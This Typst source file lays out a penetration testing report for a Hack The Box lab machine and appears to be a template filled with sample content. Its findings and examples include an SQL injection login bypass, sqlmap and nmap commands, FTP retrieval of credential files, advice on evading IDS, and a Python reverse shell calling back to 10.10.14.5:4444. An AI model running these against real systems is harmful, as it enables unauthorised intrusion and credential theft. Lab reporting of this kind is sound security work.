#import "lib.typ": *

#set page(
  paper: "a4",
  margin: (x: 2.5cm, y: 2cm),
  header: align(right)[
    #text(size: 9pt, fill: rgb("#606060"))[Security Assessment Report]
  ],
  footer: context [
    #align(center)[
      #text(size: 9pt, fill: rgb("#606060"))[
        Page #counter(page).display("1 of 1", both: true)
      ]
    ]
  ],
)

#set text(
  font: "IBM Plex Sans",
  size: 10.5pt,
  fallback: true,
)

#set par(
  justify: true,
  leading: 0.65em,
)

#set heading(
  numbering: "1.1",
)

#show heading.where(level: 1): it => block(
  width: 100%,
  fill: rgb("#2a2a2a"),
  inset: (x: 14pt, y: 10pt),
  radius: (top: 4pt),
  above: 20pt,
  below: 16pt,
)[
  #text(fill: white, size: 16pt, weight: "bold")[
    #counter(heading).display() #h(6pt) #it.body
  ]
]

#show heading.where(level: 2): it => block(
  width: 100%,
  inset: (left: 6pt, y: 8pt),
  stroke: (left: 3pt + rgb("#404040")),
  above: 14pt,
  below: 10pt,
)[
  #text(size: 13pt, weight: "semibold")[
    #counter(heading).display() #h(4pt) #it.body
  ]
]

#show heading.where(level: 3): it => block(
  width: 100%,
  above: 10pt,
  below: 8pt,
)[
  #text(size: 11pt, weight: "medium")[
    #counter(heading).display() #h(3pt) #it.body
  ]
]

#set list(
  marker: ([•], [◦], [▪]),
  indent: 10pt,
  body-indent: 6pt,
)

#set enum(
  numbering: "1.a.i.",
  indent: 10pt,
  body-indent: 6pt,
)

#align(center)[
  #text(size: 22pt, weight: "bold")[
    Penetration Testing Report
  ]
  #v(6pt)
  #text(size: 12pt, fill: rgb("#606060"))[
    Professional Security Assessment
  ]
  #v(3pt)
  #line(length: 50%, stroke: 2pt + rgb("#404040"))
]

#v(16pt)

= Executive Summary

This security assessment was conducted on target system #highlight[HTB-TARGET-01] located at #highlight[10.10.11.247]. The evaluation identified #highlight(color: red)[2 critical] and #highlight(color: orange)[3 high-severity] vulnerabilities requiring immediate attention.

= Methodology

+ Information gathering and reconnaissance
+ Network scanning and service enumeration
+ Vulnerability identification and analysis
+ Exploitation and access verification
+ Post-exploitation activities
+ Documentation and reporting

= Findings

#htb-card(
  title: "Anonymous FTP Access with Sensitive Data",
  severity: "high",
  ip: "10.10.11.247",
  port: "21/tcp",
  service: "vsftpd 3.0.3",
  finding: "The FTP service permits anonymous authentication without credentials. Multiple sensitive files were discovered including database backups and configuration files containing plaintext credentials.",
  exploit: ```
ftp 10.10.11.247
Name: anonymous
Password: anonymous@example.com

ftp> ls -la
ftp> cd backups
ftp> get database_backup.sql
ftp> get config.php
ftp> exit

cat config.php | grep -i password
  ```.text,
  remediation: "Disable anonymous FTP access. Implement SSH key-based authentication. Migrate to SFTP for encrypted transfers. Remove sensitive files from accessible directories. Enable comprehensive access logging.",
)

#v(14pt)

#htb-card(
  title: "SQL Injection in Authentication Form",
  severity: "critical",
  ip: "10.10.11.247",
  port: "80/tcp",
  service: "Apache 2.4.52",
  finding: "The login form at /admin/login.php is vulnerable to SQL injection. Authentication can be bypassed using basic SQL injection payloads, granting administrative access without valid credentials.",
  exploit: ```
sqlmap -u "http://10.10.11.247/admin/login.php" \
  --data="username=admin&password=test" \
  --level=3 --risk=2 --batch

Username: admin' OR '1'='1'-- -
Password: anything

mysql -h 10.10.11.247 -u webapp -p'discovered_password'
  ```.text,
  remediation: "Implement parameterized queries with prepared statements. Use ORM framework for database interactions. Apply input validation and sanitization. Deploy Web Application Firewall. Conduct regular code security audits.",
)

#pagebreak()

= Tools Reference

#tool-explain(
  tool-name: "Nmap",
  description: "Network exploration and security scanning tool for port discovery, service detection, and vulnerability assessment.",
  flags: (
    (
      flag: "-sS",
      name: "TCP SYN Scan",
      desc: "Stealth scan that does not complete TCP handshake. Requires root privileges. Most popular scan type.",
    ),
    (
      flag: "-sV",
      name: "Version Detection",
      desc: "Probes open ports to determine service and version information. Essential for vulnerability assessment.",
    ),
    (
      flag: "-sC",
      name: "Default Scripts",
      desc: "Runs default NSE scripts for common enumeration tasks. Equivalent to --script=default.",
    ),
    (
      flag: "-p-",
      name: "All Ports",
      desc: "Scans all 65535 TCP ports instead of top 1000. Comprehensive but time-consuming.",
    ),
    (
      flag: "-T4",
      name: "Aggressive Timing",
      desc: "Faster scan timing template on 0-5 scale. Reliable for most networks.",
    ),
    (
      flag: "--min-rate",
      name: "Minimum Rate",
      desc: "Send packets no slower than specified rate per second. Example: --min-rate=1000.",
    ),
    (
      flag: "-oA",
      name: "Output All",
      desc: "Saves results in normal, XML, and grepable formats to specified basename.",
    ),
    (
      flag: "-Pn",
      name: "Skip Ping",
      desc: "Treats all hosts as online, skipping host discovery. Useful when ICMP is blocked.",
    ),
  ),
  common-vulns: (
    (
      title: "Port Scanning Detection",
      description: "IDS/IPS systems detect aggressive scanning patterns. Use slower timing (-T2) and randomize scan order (--randomize-hosts) to evade detection.",
      cve: "N/A",
      cvss: "N/A",
    ),
    (
      title: "NSE Script Vulnerabilities",
      description: "Some NSE scripts may crash vulnerable services or trigger alerts. Test scripts in isolated environments before production use.",
      cve: "Various",
      cvss: "Variable",
    ),
  ),
  misconfigs: (
    (
      title: "Missing Firewall Rules",
      description: "Firewall not configured to block or rate-limit port scanning from external sources.",
    ),
    (
      title: "Default Service Banners",
      description: "Services expose detailed version information aiding vulnerability identification.",
    ),
    (
      title: "Unnecessary Open Ports",
      description: "Services running on non-essential ports increase attack surface.",
    ),
    (
      title: "No IDS/IPS Monitoring",
      description: "Absence of intrusion detection to alert on reconnaissance activities.",
    ),
  ),
)

#v(14pt)

= Code Block Examples

#code-block(
  title: "Port Scanning - Full TCP Range",
  lang: "bash",
  ```
nmap -sS -sV -sC -p- -T4 --min-rate=1000 -oA full_scan 10.10.11.247
  ```.text
)

#v(10pt)

#code-block(
  title: "Directory Enumeration",
  lang: "bash",
  ```
gobuster dir -u http://10.10.11.247 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50
  ```.text
)

#v(10pt)

#code-block(
  title: "Python Reverse Shell",
  lang: "python",
  ```
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.5", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
  ```.text
)

#pagebreak()

= Highlight Examples

The default credentials were #highlight[admin:admin] which provided immediate access.

Critical finding: #highlight(color: red)[Root SSH access enabled] with weak password.

Successfully exploited: #highlight(color: green)[LFI vulnerability in file parameter].

Database contains #highlight[127 user records] with plaintext passwords.

= Recommendations

== Immediate Actions Required

+ Disable anonymous FTP access
+ Patch SQL injection vulnerabilities
+ Implement strong password policies
+ Enable comprehensive logging
+ Deploy intrusion detection systems

== Long-term Improvements

+ Conduct regular security assessments
+ Implement defense-in-depth strategy
+ Establish incident response procedures
+ Provide security awareness training
+ Maintain security patch management

= Conclusion

This assessment identified critical vulnerabilities requiring immediate remediation. Priority should be given to the SQL injection and weak authentication issues. Implementation of recommended controls will significantly improve the security posture of the target environment.
